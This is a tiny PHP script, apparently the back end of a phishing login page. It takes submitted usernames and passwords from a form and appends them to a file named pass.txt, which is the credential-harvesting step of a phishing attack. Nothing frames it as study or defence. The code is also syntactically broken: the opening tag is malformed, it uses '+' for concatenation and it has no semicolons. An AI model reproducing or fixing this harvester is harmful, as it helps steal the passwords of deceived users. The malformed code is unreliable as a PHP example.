<? php
$name = $_POST['username'] + \n
$password = $_POST['password'] + " \n "
$file = fopen('pass.txt', 'a') + "\n"
fwrite($file, $name)
fwrite($file, $password)
fclose($file)
?>